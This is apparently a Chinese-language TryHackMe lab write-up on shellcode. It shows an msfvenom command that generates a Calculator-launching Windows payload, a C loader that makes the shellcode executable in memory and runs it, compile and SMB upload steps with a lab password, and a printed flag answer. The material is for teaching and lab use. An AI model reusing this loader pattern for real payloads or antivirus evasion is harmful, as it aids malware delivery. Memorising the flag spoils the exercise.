<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><p>修改你的 C 程序以执行以下 shellcode。标志是什么？</p><div class="language-cpp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cpp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">unsigned</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> message</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0xeb</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x34</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xb9</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x5e</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x48</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x89</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xf0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x80</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x34</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x08</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x01</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x48</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x83</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xc1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x01</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x48</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x83</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xf9</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x19</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x75</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0xf2</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xb8</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x01</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xbf</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x01</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xba</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x19</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x0f</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x05</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xb8</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x3c</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xbf</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x0f</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x05</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xe8</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xc7</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xff</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xff</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xff</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x55</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x49</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x4c</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x7a</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x78</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x31</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x74</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x73</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x2c</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x30</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x72</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x36</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x2c</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x34</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x69</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x32</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x30</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x30</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x62</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x31</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x65</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x32</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x7c</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x0d</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x0a</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">THM{y0ur-1s7-5h311c0d3}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="generate-shellcode---生成-shellcode">Generate Shellcode - 生成 Shellcode<a href="#generate-shellcode---生成-shellcode" class="hash-link" aria-label="Direct link to Generate Shellcode - 生成 Shellcode" title="Direct link to Generate Shellcode - 生成 Shellcode">​</a></h2>
<p>在这个任务中，我们继续处理 shellcode，并演示如何使用像 Metasploit 框架这样的公共工具生成和执行 shellcode。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="使用公共工具生成-shellcode">使用公共工具生成 Shellcode<a href="#使用公共工具生成-shellcode" class="hash-link" aria-label="Direct link to 使用公共工具生成 Shellcode" title="Direct link to 使用公共工具生成 Shellcode">​</a></h3>
<p>Shellcode 可以为特定格式和特定编程语言生成。这取决于你。例如，如果你的 dropper（即主 exe 文件）包含将发送给受害者的 shellcode，并且用 C 编写，那么我们需要生成一个适用于 C 的 shellcode 格式。</p>
<p>通过公共工具生成 shellcode 的优点是，我们不需要从头开始制作自定义 shellcode，甚至不需要精通汇编语言。大多数公共 C2 框架提供与 C2 平台兼容的 shellcode 生成器。当然，这对我们来说非常方便，但缺点是大多数，或者可以说所有生成的 shellcode 都是 AV 厂商熟知的，容易被检测到。</p>
<p>我们将在 AttackBox 上使用 Msfvenom 生成一个执行 Windows 文件的 shellcode。我们将创建一个运行 <code>calc.exe</code> 应用程序的 shellcode。</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">No encoder specified, outputting raw payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Payload size: 193 bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Final size of c file: 835 bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">unsigned char buf[] =</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>因此，Metasploit 框架生成了一个执行 Windows 计算器 (<code>calc.exe</code>) 的 shellcode。Windows 计算器作为恶意软件开发过程中常用的示例，用于展示概念验证。如果该技术有效，则会弹出一个新的 Windows 计算器实例。这确认了使用的方法能够成功执行任何可执行的 shellcode。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="shellcode-注入">Shellcode 注入<a href="#shellcode-注入" class="hash-link" aria-label="Direct link to Shellcode 注入" title="Direct link to Shellcode 注入">​</a></h3>
<p>黑客通过各种技术将 shellcode 注入到正在运行的或新的线程和进程中。Shellcode 注入技术修改程序的执行流程，更新程序的寄存器和函数，以执行攻击者的代码。</p>
<p>现在，让我们继续使用生成的 shellcode，并在操作系统上执行它。以下是包含我们生成的 shellcode 的 C 代码，该 shellcode 将被注入到内存中并执行 <code>calc.exe</code>。</p>
<p>在 AttackBox 上，让我们将以下内容保存为名为 <code>calc.c</code> 的文件：</p>
<div class="language-cpp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cpp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;windows.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> stager</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        DWORD oldProtect</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">VirtualProtect</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">stager</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">sizeof</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">stager</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> PAGE_EXECUTE_READ</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">oldProtect</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">*</span><span class="token plain">shellcode</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">void</span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">stager</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">shellcode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>现在让我们将其编译为一个 exe 文件：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ i686-w64-mingw32-gcc calc.c -o calc-MSF.exe</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>一旦我们有了 exe 文件，接下来将它传输到 Windows 机器并执行。你可以使用 <code>smbclient</code> 从你的 AttackBox 访问 SMB 共享 <code>\\10.10.14.106\Tools</code>，并使用以下命令传输文件（记得 <code>thm</code> 用户的密码是 <code>Password321</code>）：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ smbclient -U thm &#x27;//10.10.14.106/Tools&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">smb: \&gt; put calc-MSF.exe</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这应该会将你的文件复制到 Windows 机器上的 <code>C:\Tools\</code> 目录。</p>
<p>虽然你的机器的 AV 应该已被禁用，但可以尝试将你的有效载荷上传到 THM Antivirus Check，网址为 <code>http://10.10.14.106/</code>。</p>
